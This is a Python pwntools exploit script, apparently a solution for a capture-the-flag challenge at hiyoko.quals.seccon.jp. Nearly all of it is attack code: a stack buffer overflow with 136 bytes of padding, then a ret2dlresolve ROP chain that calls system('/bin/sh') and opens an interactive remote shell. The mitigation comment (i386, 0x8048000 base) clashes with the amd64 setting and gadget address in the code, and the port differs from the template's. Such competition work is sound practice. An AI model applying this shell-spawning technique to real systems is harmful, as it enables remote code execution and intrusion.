#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host hiyoko.quals.seccon.jp --port 9001 chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.arch = 'amd64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'hiyoko.quals.seccon.jp'
port = int(args.PORT or 9002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+35
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

junk = b'A'*136

ret = 0x40101a

r = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh\x00"])
r.gets(dlresolve.data_addr)
r.raw(ret)
r.ret2dlresolve(dlresolve)
raw_rop = r.chain()
io.sendline(fit({128+context.bytes: raw_rop}))

io.sendline(dlresolve.payload)

io.interactive()

